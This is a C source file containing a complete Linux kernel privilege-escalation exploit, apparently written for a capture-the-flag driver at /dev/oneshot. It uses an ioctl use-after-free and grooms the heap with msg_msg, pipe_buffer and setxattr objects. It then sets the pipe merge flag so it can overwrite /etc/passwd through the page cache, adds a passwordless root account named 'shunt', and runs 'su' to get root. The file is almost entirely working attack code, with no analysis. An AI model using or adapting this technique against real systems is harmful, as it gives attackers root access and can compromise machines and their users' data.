#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdarg.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <syscall.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include <linux/keyctl.h>

#define PAGESZ 0x1000

#define DEVICE_PATH "/dev/oneshot"
#define TARGET_CACHESZ PAGESZ
#define MAX_PIPES  0x40
#define MAX_MSG    10

#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000

#define ALLOCATE  0x13370001
#define FREE      0x13370002

typedef struct {
    long mtype;
    char mtext[];
} msg_t;

struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	void *ops;
	unsigned int flags;
	unsigned long private;
};

struct rcu_head {
    void *next;
    void *func;
};

typedef struct msg_msg {
    struct rcu_head m_list;
    long m_type;
    size_t m_ts;      /* message text size */
    struct msg_msgseg *next;
    void *security;
    /* the actual message follows immediately */
} msg_msg_t;

typedef int32_t key_serial_t;

int pipes[MAX_PIPES][0x02];
int qids[MAX_MSG];
int fd;

void log_err(const char *format, ...) {
    if (!format) {
        exit(EXIT_FAILURE);
    }

    fprintf(stderr, "%s", "[-] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "\n");
    fflush(stderr);

    exit(EXIT_FAILURE);
}

#define SAFE(result) \
({ \
    typeof(result) _r = (result); \
    if (_r < 0) log_err("[-] %s:%d: returned %p", __FILE__, __LINE__, _r); \
    _r; \
});

void debug() {
	printf("Debug\n");
    getchar();
}

int _ioctl(int fd, long CMD, void* buffer) {
  return syscall(SYS_ioctl, fd, CMD, buffer);
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+]");
    vprintf(format, args);

    va_end(args);
}

void alloc_pipe_buf(int i) {
    SAFE(pipe(pipes[i]));
}

void release_pipe_buf(int i) {
    SAFE(close(pipes[i][0]));
    SAFE(close(pipes[i][1]));
}

static void alloc_qid(int i) {
    qids[i] = SAFE(msgget(IPC_PRIVATE, 0666 | IPC_CREAT));
}

static void send_msg(int qid, int c, int size, long type)
{
    struct msgbuf
    {
        long mtype;
        char mtext[size - sizeof(msg_msg_t)];
    } msg;

    if (!type) {
        msg.mtype = 0xffff;
    }
    else {
        msg.mtype = type;
    }

    memset(msg.mtext, c, sizeof(msg.mtext));

    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0)
    {
        printf("[-] msgsnd");
    }
}

void kmalloc_4k() {
    char buffer[0x1000];
    SAFE(_ioctl(fd, ALLOCATE, &buffer));
}

void kfree_4k() {
    SAFE(_ioctl(fd, FREE, NULL));
}

int main(void) {
    fd = SAFE(open(DEVICE_PATH, O_RDONLY));
    int passwd_fd = SAFE(open("/etc/passwd", O_RDONLY));

    // preparing freelist
    alloc_pipe_buf(0);
    SAFE(fcntl(pipes[0][0], F_SETPIPE_SZ, PAGESZ * 0x40));

    // allocate and free target slab
    kmalloc_4k();
    kfree_4k();
    release_pipe_buf(0);    // release to freelist, so this will be occupied by msgmsg and target slab by msgmsg_seg

    alloc_qid(0);
    send_msg(qids[0], 0x69, 0x2000, 0); // occupy target slab with msgmsg_seg

    // debug();

    kfree_4k(); // free msgmsg_seg

    // reclaim msgmsg_seg with pipe_buffer
    alloc_pipe_buf(1);
    SAFE(fcntl(pipes[1][0], F_SETPIPE_SZ, PAGESZ * 0x40));

    char lol[5];
    SAFE(write(pipes[1][1], &lol, 5));
    SAFE(read(pipes[1][0], &lol, 5));
    // release_pipe_buf(1);

    kfree_4k();
    alloc_pipe_buf(2);
    SAFE(fcntl(pipes[2][0], F_SETPIPE_SZ, PAGESZ * 0x40));

    // allocate file-backed pipe_buffer
	splice(passwd_fd, NULL, pipes[1][1], NULL, 1, 0); // 1

    char* msg_buf = malloc(0x2000);
    msgrcv(qids[0], msg_buf, 0x2000-0x38, 0, MSG_NOERROR);
    // debug();

    char* pipe_buffer_arr = msg_buf+0x1000-0x30;
    memset(pipe_buffer_arr, 0, 0x8);
    struct pipe_buffer* pipe_buffer = (struct pipe_buffer**)(msg_buf+0x1000-8);
    pipe_buffer->flags |= 0x10;
    pipe_buffer->offset = -1;

    setxattr("/tmp/", "x", pipe_buffer_arr, 0x1000-0x28, XATTR_CREATE);

    const char *const passwd = "shunt::0:0:shunt:/root:/bin/sh\n";
    SAFE(write(pipes[1][1], passwd, sizeof(passwd)));

    system("cat /etc/passwd");
    system("su shunt");
    debug();
}
